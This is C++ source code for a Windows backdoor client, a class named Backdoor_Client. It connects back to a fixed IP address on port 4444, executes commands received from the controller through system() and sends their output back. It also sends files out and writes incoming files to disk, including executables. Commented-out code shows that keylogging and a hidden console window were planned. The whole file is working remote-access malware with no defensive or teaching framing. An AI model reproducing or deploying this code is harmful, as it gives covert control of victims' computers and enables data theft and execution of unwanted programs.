#include <WinSock2.h>
#include <iostream>
#include <string>
#include <fstream>
#include <Windows.h>

using namespace std;

//---------------------------
#pragma warning(disable : 4996)
#pragma comment (lib, "ws2_32.lib")
//---------------------------------
SOCKET s;
//--------------------------------

//-------------------------------
const char ip[] = "192.168.5.131";
const int port = 4444;
//-------------------------------

//----------PATH------------------
char command_file[] = "!mine@file.txt";
//--------------------------------
class Backdoor_Client {
public:

	void download(const char* command) {

		char word[256] = {}; // {} - obnylenie ctobi liwnee ne prilipalo k strokam
		int count = 0;
		// Find the name of file
		for (int i = 9; i < 256; ++i) {
			word[count] = command[i];
			count++;

		}
		char format[3] = {};
		for (int i = 0; i < 256; ++i) {
			if (word[i] == '.') {
				format[0] = word[i + 1];
				format[1] = word[i + 2];
				format[2] = word[i + 3];
				break;
			}
		}
		if (format[0] == 't' && format[1] == 'x' && format[2] == 't') {
			ifstream in(word);

			while(in) {
				string str;
				getline(in, str);
				char msg[256] = {};
				msg[0] = '\n';
				for (int i = 1; i <= str.size(); ++i) {
					msg[i] = str[i - 1];
				}
				send(s, msg, sizeof(msg), NULL);
			}
			char end[256] = "!stop";	// End of the file
			send(s, end, sizeof(end), NULL);

		}

		else {

			ifstream in(word, ios::binary);
			char buffer[5000] = {};

			while (in.read(buffer, sizeof(buffer))) {
				send(s, buffer, in.gcount(), NULL);

			}
			char end[5000] = "ex";	// End of the file
			send(s, end, sizeof(end), NULL);
		}
	}

	void upload(const char* command) {

		char name[256] = {};
		int count = 0;

		//----Find the name of file-----
		for (int i = 7; i < 256; ++i) {
			name[count] = command[i];
			count++;
		}
		//-------------------------------
		
		char format[3] = {};

		for (int i = 0; i < 256; ++i) {
			if (name[i] == '.') {
				format[0] = name[i + 1];
				format[1] = name[i + 2];
				format[2] = name[i + 3];
				break;
			}
		}
		if (format[0] == 't' && format[1] == 'x' && format[2] == 't') {

			ofstream out(name);
			if (!out.is_open()) {
				cout << "ERROR #2";
				exit(1);
			}

			// Receiving the binary code and paste in file named real_cmd
			count = 0;
			while (count < 10000) {

				char res[256] = {};
				recv(s, res, sizeof(res), NULL);

				if (res[0] == '!' && res[1] == 's' && res[2] == 't' && res[3] == 'o' && res[4] == 'p' && res[5] == NULL) break;

				out.write(res, sizeof(res));

				count++;
			}
			out.close();
			char res[24] = "[+] A file was uploaded";
			send(s, res, sizeof(res), NULL);
		}

		if (format[0] == 'e' && format[1] == 'x' && format[2] == 'e') {
			ofstream out(name, ios::binary);
			
			if (out.is_open())
			{
				char res[5000] = {};
				while (true) {

					
					recv(s, res, sizeof(res), NULL);
					if (res[0] == 'e' && res[1] == 'x' && res[2] == NULL) break;
					out.write(res, sizeof(res));
					SecureZeroMemory(&res, sizeof(res));

				}
			}
			char res[24] = "[+] A file was uploaded";
			send(s, res, sizeof(res), NULL);
			exit(1);
		}

		else {

			ofstream out(name, ios::binary);
			count = 0;
			while (count < 10000) {

				char res[5000] = {};
				recv(s, res, sizeof(res), NULL);
				if (res[0] == 'e' && res[1] == 'x' && res[2] == NULL) break;
				out.write(res, sizeof(res));
				cout << res << "\n=========================" << endl;
				count++;
			}
			out.close();
			char res[24] = "[+] A file was uploaded";
			send(s, res, sizeof(res), NULL);

		}
	}


	void exec(const char* command, char flag) {

		if (flag == 'A') {
			download(command);
		}
		if (flag == 'B') {
			upload(command);
		}
		if (command[0] == 'q' && command[1] == NULL) {

			closesocket(s);
			exit(1);
		}
		if (command[0] == 'e' && command[1] == 'c' && command[2] == 'h' && command[3] == 'o' && command[4] == ' ') {
			system(command);
			char msg[] = "[+] Echo executed";
			send(s, msg, sizeof(msg), NULL);

		}


		else {

			char full_command[2000] = {};
			string cmd = command;
			cmd.append(" > !mine@file.txt");
			for (int i = 0; i < cmd.size(); ++i) {
				full_command[i] = cmd[i];
			}
			system(full_command);
			ifstream read(command_file);

			if (!read.is_open()) {
				cout << "ERROR" << endl;
			}

			else {

				string str;
				while (getline(read, str)) {

					char arr[8000] = {};
					str += "\n";
					for (int i = 0; i < str.size(); ++i) {
						arr[i] = str[i];
					}
					send(s, arr, sizeof(arr), NULL);
					Sleep(10);
				}
			}

			char end[8000] = "ex";	// End of the file
			send(s, end, sizeof(end), NULL);

			read.close();
			system("del !mine@file.txt");
		}
	}
	
	char Test_On_Command(char* command) {
		//------------Download------------------
		string download = "abcdefga";
		for (int i = 0; i < 8; ++i) {
			download[i] = command[i];
		}
		if (download == "download") return 'A';
		//--------------------------------------
		//------------Upload--------------------
		string upload = "bapghe";
		for (int i = 0; i < 6; ++i) {
			upload[i] = command[i];
		}
		if (upload == "upload") return 'B';
		//-----------------------------------
		////----------Keylog_start------------------------
		//string keylog_start = "qfgzdqpvsghp";
		//for (int i = 0; i < 12; ++i) {
		//	keylog_start[i] = command[i];
		//}
		//if (keylog_start == "keylog_start") return 'C';
		////----------------------------------------------
		////---------Keylog_dump---------------------------
		//string keylog_dump = "qwertgxhkyu";
		//for (int i = 0; i < 1; ++i) {
		//	keylog_dump[i] = command[i];
		//}
		//if (keylog_start == "keylog_dump") return 'D';
		////-----------------------------------------------
		//
		return NULL;
	}


	void ClientHandler() {

		while (true) {
			char msg[256];
			recv(s, msg, sizeof(msg), NULL);
			char flag = Test_On_Command(msg);
			exec(msg, flag);
		}
	}
};

int main() {
	
	//-----Hide the console-----------
	//HWND hwnd = GetConsoleWindow();
	//ShowWindow(hwnd, SW_HIDE);
	//--------------------------------

	//WSAStartup
	WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 2);
	if (WSAStartup(DLLVersion, &wsaData) != 0) {
		cout << "Error" << endl;
		exit(1);
	}
	SOCKADDR_IN addr;
	s = socket(AF_INET, SOCK_STREAM, NULL);
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(ip); 
	addr.sin_port = htons(port);
	while (true) {
		if (connect(s, (SOCKADDR*)&addr, sizeof(addr)) == 0) {
			break;
		}
		Sleep(10000);
			
	}
	Backdoor_Client client;
	client.ClientHandler();

	return 0;

}


// Dopisat, esli user owibetsia v nazvanii faila
// Esli eto text, otkrit ego i perenesti text